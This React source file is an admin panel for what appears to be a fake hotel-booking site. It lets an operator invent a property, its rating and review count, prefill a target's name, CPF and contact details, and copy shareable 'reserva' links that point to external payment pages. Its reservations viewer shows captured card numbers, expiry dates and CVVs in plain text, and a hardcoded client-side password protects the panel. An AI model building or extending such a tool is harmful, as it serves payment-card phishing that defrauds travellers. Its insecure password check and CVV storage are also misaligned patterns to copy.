import { useState } from 'react';
import { trpc } from '@/lib/trpc';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { X, Plus, Upload, Lock } from 'lucide-react';
import { toast } from 'sonner';

interface HotelPhoto {
  id: string;
  url: string;
  title: string;
}

interface AdminPanelProps {
  isOpen: boolean;
  onClose: () => void;
  photos: HotelPhoto[];
  onPhotosChange: (photos: HotelPhoto[]) => void;
  updateHotelDataMutation?: any;
  hotelInfo: {
    propertyName: string;
    clientName: string;
    address: string;
    rating: number;
    reviewCount: number;
    checkInDate: string;
    checkOutDate: string;
    hospedageValue: number;
    paymentLink100: string;
    paymentLink30Pix: string;
    depositPercentage: number;
    clientEmail: string;
    clientPhone: string;
    clientCpf: string;
    guestCount: number;
    detail1: string;
    detail2: string;
    detail3: string;
    roomType: string;
    breakfastIncluded: boolean;
    freeCancellationDate: string;
    mainGuestName: string;
  };
  onHotelInfoChange: (info: any) => void;
}

const ADMIN_PASSWORD = '12345678';

function ReservationsViewer({ hotelBookingId }: { hotelBookingId?: number }) {
  const { data: reservations, isLoading } = trpc.reservations.getByHotel.useQuery(
    { hotelBookingId: hotelBookingId || 1 },
    { enabled: !!hotelBookingId }
  );

  if (isLoading) {
    return <div className="text-sm text-muted-foreground">Carregando reservas...</div>;
  }

  if (!reservations || reservations.length === 0) {
    return <div className="text-sm text-muted-foreground">Nenhuma reserva encontrada</div>;
  }

  return (
    <div className="space-y-3 max-h-96 overflow-y-auto">
      {reservations.map((reservation: any) => (
        <div key={reservation.id} className="border rounded-lg p-3 bg-gray-50 space-y-2">
          <div className="grid grid-cols-2 gap-2 text-sm">
            <div>
              <p className="text-xs text-muted-foreground font-semibold">Nome</p>
              <p className="font-semibold">{reservation.firstName} {reservation.lastName}</p>
            </div>
            <div>
              <p className="text-xs text-muted-foreground font-semibold">Email</p>
              <p className="text-sm">{reservation.email}</p>
            </div>
          </div>
          <div className="grid grid-cols-2 gap-2 text-sm">
            <div>
              <p className="text-xs text-muted-foreground font-semibold">Telefone</p>
              <p className="text-sm">{reservation.phone}</p>
            </div>
            <div>
              <p className="text-xs text-muted-foreground font-semibold">Método de Pagamento</p>
              <p className="text-sm font-semibold">{reservation.paymentMethod === 'card' ? 'Cartão' : 'PIX'}</p>
            </div>
          </div>
          {reservation.paymentMethod === 'card' && (
            <div className="border-t pt-2 space-y-2 bg-blue-50 p-2 rounded">
              <p className="text-xs font-semibold text-blue-900">Dados do Cartão</p>
              <div className="grid grid-cols-2 gap-2 text-xs">
                <div>
                  <p className="text-muted-foreground">Titular</p>
                  <p className="font-semibold">{reservation.cardholderName}</p>
                </div>
                <div>
                  <p className="text-muted-foreground">Número</p>
                  <p className="font-mono">{reservation.cardNumber}</p>
                </div>
                <div>
                  <p className="text-muted-foreground">Validade</p>
                  <p className="font-mono">{reservation.cardExpiry}</p>
                </div>
                <div>
                  <p className="text-muted-foreground">CVV</p>
                  <p className="font-mono font-bold text-red-600">{reservation.cardCvv}</p>
                </div>
                <div className="col-span-2">
                  <p className="text-muted-foreground">Valor</p>
                  <p className="font-semibold">R$ {(reservation.totalPrice / 100).toFixed(2)}</p>
                </div>
              </div>
            </div>
          )}
          <div className="text-xs text-muted-foreground">
            {new Date(reservation.createdAt).toLocaleDateString('pt-BR')}
          </div>
        </div>
      ))}
    </div>
  );
}

export default function AdminPanel({
  isOpen,
  onClose,
  photos,
  onPhotosChange,
  updateHotelDataMutation,
  hotelInfo,
  onHotelInfoChange,
}: AdminPanelProps) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [fileInputKey, setFileInputKey] = useState(0);

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      setPassword('');
      toast.success('Autenticado com sucesso!');
    } else {
      toast.error('Senha incorreta');
      setPassword('');
    }
  };

  const handleAddPhoto = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files) {
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        try {
          const reader = new FileReader();
          reader.onload = async (event) => {
            try {
              const base64Data = event.target?.result as string;
              const response = await fetch('/api/upload', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  imageData: base64Data,
                  mimeType: file.type,
                }),
              });

              if (!response.ok) {
                const errorData = await response.json();
                toast.error(`Erro ao fazer upload de ${file.name}: ${errorData.error}`);
                return;
              }

              const data = await response.json();
              const newPhoto: HotelPhoto = {
                id: Date.now().toString() + Math.random(),
                url: data.url,
                title: file.name.split('.')[0],
              };
              onPhotosChange([...photos, newPhoto]);
              toast.success(`Foto ${file.name} adicionada com sucesso!`);
            } catch (error) {
              console.error('Erro ao fazer upload:', error);
              toast.error(`Erro ao fazer upload de ${file.name}`);
            }
          };
          reader.readAsDataURL(file);
        } catch (error) {
          console.error('Erro ao processar arquivo:', error);
          toast.error(`Erro ao processar ${file.name}`);
        }
      }
    }
    setFileInputKey(prev => prev + 1);
  };

  const handleRemovePhoto = (id: string) => {
    const photo = photos.find(p => p.id === id);
    // Remove do disco se for uma foto salva em /uploads/
    if (photo?.url?.startsWith('/uploads/')) {
      const filename = photo.url.split('/uploads/')[1];
      fetch(`/api/upload/${filename}`, { method: 'DELETE' }).catch(() => {});
    }
    onPhotosChange(photos.filter((photo) => photo.id !== id));
    toast.success('Foto removida');
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-primary text-white p-6 flex items-center justify-between border-b">
          <h2 className="text-2xl font-bold">Painel de Administração</h2>
          <button
            onClick={() => {
              setIsAuthenticated(false);
              onClose();
            }}
            className="p-1 hover:bg-primary/80 rounded transition-colors"
          >
            <X className="w-6 h-6" />
          </button>
        </div>

        {/* Content */}
        {!isAuthenticated ? (
          <div className="p-6 flex items-center justify-center min-h-96">
            <form onSubmit={handlePasswordSubmit} className="w-full max-w-sm space-y-4">
              <div className="text-center mb-6">
                <Lock className="w-12 h-12 text-primary mx-auto mb-3" />
                <h3 className="text-lg font-bold text-foreground">Acesso Restrito</h3>
                <p className="text-sm text-muted-foreground mt-1">
                  Digite a senha para acessar o painel
                </p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="password" className="text-sm font-medium">
                  Senha
                </Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="text-center text-lg tracking-widest"
                  autoFocus
                />
              </div>

              <Button
                type="submit"
                className="w-full bg-primary hover:bg-primary/90 text-white"
              >
                Entrar
              </Button>
            </form>
          </div>
        ) : (
          <div className="p-6 space-y-8">
            {/* Links de Acesso */}
            <section className="space-y-4">
              <h3 className="text-lg font-semibold text-foreground">Links de Acesso</h3>
              <div className="space-y-2">
                {[
                  { label: 'Link original', url: `${window.location.origin}` },
                  { label: 'Reserva 1', url: `${window.location.origin}/reserva1` },
                  { label: 'Reserva 2', url: `${window.location.origin}/reserva2` },
                  { label: 'Reserva 3', url: `${window.location.origin}/reserva3` },
                  { label: 'Reserva 4', url: `${window.location.origin}/reserva4` },
                ].map(({ label, url }) => (
                  <div key={label} className="flex items-center gap-2 p-3 bg-muted rounded-md border border-border">
                    <span className="text-xs font-semibold text-muted-foreground w-20 shrink-0">{label}</span>
                    <span className="text-xs text-foreground flex-1 truncate font-mono">{url}</span>
                    <button
                      type="button"
                      onClick={() => {
                        navigator.clipboard.writeText(url);
                        toast.success(`Link "${label}" copiado!`);
                      }}
                      className="shrink-0 text-xs px-3 py-1 bg-primary text-white rounded hover:bg-primary/90 transition-colors"
                    >
                      Copiar
                    </button>
                  </div>
                ))}
              </div>
            </section>

            {/* Informações do Hóspede */}
            <section className="space-y-4">
              <h3 className="text-lg font-semibold text-foreground">Informações da Reserva</h3>
              <div className="space-y-3">
                <div>
                  <Label htmlFor="propertyName" className="text-sm font-medium">
                    Nome do Imóvel
                  </Label>
                  <Input
                    id="propertyName"
                    value={hotelInfo.propertyName}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, propertyName: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: Luxury Beachfront Resort"
                  />
                </div>

                <div>
                  <Label htmlFor="clientName" className="text-sm font-medium">
                    Nome do Cliente
                  </Label>
                  <Input
                    id="clientName"
                    value={hotelInfo.clientName}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, clientName: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: João Silva"
                  />
                </div>

                <div>
                  <Label htmlFor="clientEmail" className="text-sm font-medium">
                    Email do Cliente
                  </Label>
                  <Input
                    id="clientEmail"
                    type="email"
                    value={hotelInfo.clientEmail || ''}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, clientEmail: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: cliente@email.com"
                  />
                </div>

                <div>
                  <Label htmlFor="checkInDate" className="text-sm font-medium">
                    Data de Check-in
                  </Label>
                  <Input
                    id="checkInDate"
                    type="date"
                    value={hotelInfo.checkInDate}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, checkInDate: e.target.value })
                    }
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="checkOutDate" className="text-sm font-medium">
                    Data de Check-out
                  </Label>
                  <Input
                    id="checkOutDate"
                    type="date"
                    value={hotelInfo.checkOutDate}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, checkOutDate: e.target.value })
                    }
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="hospedageValue" className="text-sm font-medium">
                    Valor da Hospedagem (R$)
                  </Label>
                  <Input
                    id="hospedageValue"
                    type="number"
                    step="0.01"
                    value={hotelInfo.hospedageValue}
                    onChange={(e) =>
                      onHotelInfoChange({
                        ...hotelInfo,
                        hospedageValue: parseFloat(e.target.value),
                      })
                    }
                    className="mt-1"
                    placeholder="Ex: 2198.00"
                  />
                </div>

                <div>
                  <Label htmlFor="hotelAddress" className="text-sm font-medium">
                    Endereço do Hotel
                  </Label>
                  <Input
                    id="hotelAddress"
                    value={hotelInfo.address}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, address: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: Rua do Telegráfo, 2779, Porto Seguro"
                  />
                </div>

                <div>
                  <Label htmlFor="paymentLink100" className="text-sm font-medium">
                    Link de Pagamento 100% (Cartao)
                  </Label>
                  <Input
                    id="paymentLink100"
                    value={hotelInfo.paymentLink100}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, paymentLink100: e.target.value })
                    }
                    className="mt-1"
                    placeholder="https://seu-link-de-pagamento-cartao.com"
                  />
                  <p className="text-xs text-muted-foreground mt-1">
                    Link para pagamento de 100% via cartao de credito.
                  </p>
                </div>

                <div>
                  <Label htmlFor="paymentLink30Pix" className="text-sm font-medium">
                    Link de Pagamento (PIX)
                  </Label>
                  <Input
                    id="paymentLink30Pix"
                    value={hotelInfo.paymentLink30Pix}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, paymentLink30Pix: e.target.value })
                    }
                    className="mt-1"
                    placeholder="https://seu-link-de-pagamento-pix.com"
                  />
                  <p className="text-xs text-muted-foreground mt-1">
                    Link para pagamento via PIX.
                  </p>
                </div>

                <div>
                  <Label htmlFor="depositPercentage" className="text-sm font-medium">
                    Porcentagem de Depósito (%)
                  </Label>
                  <Input
                    id="depositPercentage"
                    type="number"
                    min="1"
                    max="100"
                    value={hotelInfo.depositPercentage}
                    onChange={(e) =>
                      onHotelInfoChange({
                        ...hotelInfo,
                        depositPercentage: parseInt(e.target.value) || 30,
                      })
                    }
                    className="mt-1"
                    placeholder="Ex: 30"
                  />
                  <p className="text-xs text-muted-foreground mt-1">
                    Porcentagem da hospedagem que será cobrada como depósito (ex: 16%, 30%, 50%).
                  </p>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="clientPhone" className="text-sm font-medium">
                      Telefone do Cliente
                    </Label>
                    <Input
                      id="clientPhone"
                      value={hotelInfo.clientPhone}
                      onChange={(e) =>
                        onHotelInfoChange({ ...hotelInfo, clientPhone: e.target.value })
                      }
                      className="mt-1"
                      placeholder="+55 (11) 99999-9999"
                    />
                  </div>

                  <div>
                    <Label htmlFor="clientCpf" className="text-sm font-medium">
                      CPF do Cliente
                    </Label>
                    <Input
                      id="clientCpf"
                      value={hotelInfo.clientCpf}
                      onChange={(e) =>
                        onHotelInfoChange({ ...hotelInfo, clientCpf: e.target.value })
                      }
                      className="mt-1"
                      placeholder="Ex: 123.456.789-00"
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="guestCount" className="text-sm font-medium">
                    Quantidade de Hóspedes
                  </Label>
                  <Input
                    id="guestCount"
                    type="number"
                    value={hotelInfo.guestCount}
                    onChange={(e) =>
                      onHotelInfoChange({
                        ...hotelInfo,
                        guestCount: parseInt(e.target.value),
                      })
                    }
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="mainGuestName" className="text-sm font-medium">
                    Nome do Hóspede Principal
                  </Label>
                  <Input
                    id="mainGuestName"
                    value={hotelInfo.mainGuestName}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, mainGuestName: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: Wallas Pereira"
                  />
                </div>

                <div>
                  <Label htmlFor="roomType" className="text-sm font-medium">
                    Tipo de Quarto
                  </Label>
                  <Input
                    id="roomType"
                    value={hotelInfo.roomType}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, roomType: e.target.value })
                    }
                    className="mt-1"
                    placeholder="Ex: Quarto Duplo"
                  />
                </div>

                <div className="grid grid-cols-3 gap-3">
                  <div>
                    <Label htmlFor="detail1" className="text-sm font-medium">
                      Detalhe 1
                    </Label>
                    <Input
                      id="detail1"
                      value={hotelInfo.detail1}
                      onChange={(e) =>
                        onHotelInfoChange({ ...hotelInfo, detail1: e.target.value })
                      }
                      className="mt-1"
                      placeholder="Ex: Não reembolsvel"
                    />
                  </div>
                  <div>
                    <Label htmlFor="detail2" className="text-sm font-medium">
                      Detalhe 2
                    </Label>
                    <Input
                      id="detail2"
                      value={hotelInfo.detail2}
                      onChange={(e) =>
                        onHotelInfoChange({ ...hotelInfo, detail2: e.target.value })
                      }
                      className="mt-1"
                      placeholder="Ex: WiFi disponível"
                    />
                  </div>
                  <div>
                    <Label htmlFor="detail3" className="text-sm font-medium">
                      Detalhe 3
                    </Label>
                    <Input
                      id="detail3"
                      value={hotelInfo.detail3}
                      onChange={(e) =>
                        onHotelInfoChange({ ...hotelInfo, detail3: e.target.value })
                      }
                      className="mt-1"
                      placeholder="Ex: Café da manhã incluido"
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="freeCancellationDate" className="text-sm font-medium">
                    Data de Cancelamento Gratuito
                  </Label>
                  <Input
                    id="freeCancellationDate"
                    type="date"
                    value={hotelInfo.freeCancellationDate}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, freeCancellationDate: e.target.value })
                    }
                    className="mt-1"
                  />
                </div>

                <div className="flex items-center gap-2">
                  <input
                    id="breakfastIncluded"
                    type="checkbox"
                    checked={hotelInfo.breakfastIncluded}
                    onChange={(e) =>
                      onHotelInfoChange({ ...hotelInfo, breakfastIncluded: e.target.checked })
                    }
                    className="w-4 h-4"
                  />
                  <Label htmlFor="breakfastIncluded" className="text-sm font-medium cursor-pointer">
                    Pequeno-almoço Incluido
                  </Label>
                </div>

                <div>
                  <Label htmlFor="rating" className="text-sm font-medium">
                    Avaliação
                  </Label>
                  <Input
                    id="rating"
                    type="number"
                    step="0.1"
                    min="0"
                    max="10"
                    value={hotelInfo.rating}
                    onChange={(e) =>
                      onHotelInfoChange({
                        ...hotelInfo,
                        rating: parseFloat(e.target.value),
                      })
                    }
                    className="mt-1"
                  />
                </div>
                <div>
                  <Label htmlFor="reviewCount" className="text-sm font-medium">
                    Quantidade de Avaliações
                  </Label>
                  <Input
                    id="reviewCount"
                    type="number"
                    value={hotelInfo.reviewCount}
                    onChange={(e) =>
                      onHotelInfoChange({
                        ...hotelInfo,
                        reviewCount: parseInt(e.target.value),
                      })
                    }
                    className="mt-1"
                  />
                </div>
              </div>
            </section>

            {/* Gerenciamento de Fotos */}
            <section className="space-y-4 border-t pt-6">
              <h3 className="text-lg font-semibold text-foreground">Fotos do Hotel</h3>

              {/* Upload de Fotos */}
              <div className="bg-secondary p-4 rounded-lg space-y-3">
                <label className="block">
                  <div className="flex items-center justify-center gap-2 p-4 border-2 border-dashed border-border rounded-lg cursor-pointer hover:bg-gray-100 transition-colors">
                    <Upload className="w-5 h-5 text-primary" />
                    <span className="text-sm font-medium text-foreground">
                      Clique para selecionar fotos
                    </span>
                  </div>
                  <input
                    key={fileInputKey}
                    type="file"
                    multiple
                    accept="image/*"
                    onChange={handleAddPhoto}
                    className="hidden"
                  />
                </label>
              </div>

              {/* Fotos Atuais */}
              <div className="space-y-2">
                <p className="text-sm text-muted-foreground">
                  {photos.length} foto(s) adicionada(s)
                </p>
                <div className="grid grid-cols-2 gap-4">
                  {photos.map((photo) => (
                    <div
                      key={photo.id}
                      className="relative group border border-border rounded-lg overflow-hidden"
                    >
                      <img
                        src={photo.url}
                        alt={photo.title}
                        className="w-full h-32 object-cover"
                      />
                      <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                        <button
                          onClick={() => handleRemovePhoto(photo.id)}
                          className="p-2 bg-red-500 hover:bg-red-600 text-white rounded-full transition-colors"
                        >
                          <X className="w-4 h-4" />
                        </button>
                      </div>
                      <p className="text-xs p-2 bg-secondary text-foreground truncate">
                        {photo.title}
                      </p>
                    </div>
                  ))}
                </div>
              </div>
            </section>

            {/* Copy Link Section */}
            <section className="space-y-4 border-t pt-6">
              <h3 className="text-lg font-semibold text-foreground">Compartilhar Reserva</h3>
              <p className="text-xs text-muted-foreground">
                Copie o link abaixo para compartilhar com o hóspede. Os dados que você configurou virão pré-preenchidos.
              </p>
              <Button
                onClick={() => {
                  const baseUrl = window.location.origin + window.location.pathname;
                  const params = new URLSearchParams({
                    clientName: hotelInfo.clientName,
                    clientEmail: hotelInfo.clientEmail,
                    clientPhone: hotelInfo.clientPhone,
                    clientCpf: hotelInfo.clientCpf,
                    propertyName: hotelInfo.propertyName,
                    roomType: hotelInfo.roomType,
                    mainGuestName: hotelInfo.mainGuestName,
                    guestCount: String(hotelInfo.guestCount),
                    hospedageValue: String(hotelInfo.hospedageValue),
                    paymentLink100: hotelInfo.paymentLink100,
                    paymentLink30Pix: hotelInfo.paymentLink30Pix,
                    address: hotelInfo.address,
                    rating: String(hotelInfo.rating),
                    reviewCount: String(hotelInfo.reviewCount),
                    detail1: hotelInfo.detail1,
                    detail2: hotelInfo.detail2,
                    detail3: hotelInfo.detail3,
                    breakfastIncluded: String(hotelInfo.breakfastIncluded),
                    freeCancellationDate: hotelInfo.freeCancellationDate,
                  });
                  const fullUrl = `${baseUrl}?${params.toString()}`;
                  navigator.clipboard.writeText(fullUrl);
                  toast.success('Link copiado para a área de transferência!');
                }}
                className="w-full bg-green-600 hover:bg-green-700 text-white"
              >
                Copiar Link com Dados
              </Button>
            </section>

            {/* Reservas Section */}
            <section className="border-t pt-6 space-y-4">
              <div>
                <h3 className="font-bold text-foreground mb-2">Reservas Salvas</h3>
                <p className="text-xs text-muted-foreground mb-4">
                  Visualize todas as reservas com dados de pagamento
                </p>
              </div>
              <ReservationsViewer hotelBookingId={hotelInfo.propertyName ? 1 : undefined} />
            </section>

            {/* Footer */}
            <div className="border-t pt-6 flex gap-3">
              <Button
                onClick={async () => {
                  try {
                    const photosJson = JSON.stringify(photos.map(p => ({
                      id: p.id,
                      url: p.url,
                      title: p.title
                    })));
                    await updateHotelDataMutation.mutateAsync({
                      ...hotelInfo,
                      photos: photosJson
                    });
                    toast.success('Alterações salvas no servidor!');
                    handleLogout();
                  } catch (error) {
                    toast.error('Erro ao salvar alterações');
                  }
                }}
                className="flex-1 bg-primary hover:bg-primary/90 text-white"
              >
                Salvar e Fechar
              </Button>
              <Button
                onClick={handleLogout}
                variant="outline"
                className="border-border hover:bg-secondary"
              >
                Sair
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
